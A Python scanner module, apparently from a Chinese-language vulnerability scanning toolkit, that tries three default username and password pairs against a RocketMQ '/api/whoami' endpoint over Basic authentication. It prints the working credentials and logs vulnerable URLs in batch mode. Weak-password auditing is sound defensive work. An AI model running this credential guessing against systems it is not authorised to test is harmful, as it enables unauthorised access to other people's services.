#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.reqset import ReqSet
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class RocketUserScan:
    def poc1(self,url):
        head = {
            'User-Agent': self.header,
            'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.get(url, headers=head, verify=self.verify, proxies=self.proexis)
            response.encoding = response.apparent_encoding
            if 'name' in response.text:
                OutPrintInfoSuc("RocketMQ", f'存在RocketMQ弱口令漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("RocketMQ", f'响应体: \n{response.text}')
                    OutPrintInfo("RocketMQ",'用户名: [b bright_red]guest[/b bright_red] | 密码: [b bright_red]guest[/b bright_red]')
                else:
                    OutPutFile("rocketmq_user.txt",f'存在RocketMQ弱口令漏洞: {url}')
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("RocketMQ","目标请求出错")
    def poc2(self,url):
        head = {
            'User-Agent': self.header,
            'Authorization': 'Basic YWRtaW46YWRtaW4=',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.get(url, headers=head, verify=self.verify, proxies=self.proexis)
            # response.encoding = response.apparent_encoding
            if 'name' in response.text:
                OutPrintInfoSuc("RocketMQ", f'存在RocketMQ弱口令漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("RocketMQ", f'响应体: \n{response.text}')
                    OutPrintInfo("RocketMQ",'用户名: [b bright_red]admin[/b bright_red] | 密码: [b bright_red]admin[/b bright_red]')
                else:
                    OutPutFile("rocketmq_user.txt",f'存在RocketMQ弱口令漏洞: {url}')
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("RocketMQ", "目标请求出错")
    def poc3(self,url):
        head = {
            'User-Agent': self.header,
            'Authorization': 'Basic Z3Vlc3Q6MTIzNDU2',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.get(url, headers=head, verify=self.verify, proxies=self.proexis)
            # response.encoding = response.apparent_encoding
            if 'name' in response.text:
                OutPrintInfoSuc("RocketMQ", f'存在RocketMQ弱口令漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("RocketMQ", f'响应体: \n{response.text}')
                    OutPrintInfo("RocketMQ",'用户名: [b bright_red]guest[/b bright_red] | 密码: [b bright_red]123456[/b bright_red]')
                else:
                    OutPutFile("rocketmq_user.txt",f'存在RocketMQ弱口令漏洞: {url}')
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("RocketMQ","目标请求出错")
    def main(self,target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ') + '/api/whoami'
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            reqset = ReqSet(proxy=proxy)
            self.proexis = reqset["proxy"]
        else:
            self.proexis = {"http": proxy, "https": proxy}
        if not self.batch:
            OutPrintInfo("RocketMQ",'开始检测RocketMQ弱口令漏洞')
        if self.poc1(url):
            return

        if self.poc2(url):
            return
        if self.poc3(url):
            return
        if not self.batch:
            OutPrintInfo("RocketMQ",'RocketMQ弱口令漏洞检测结束')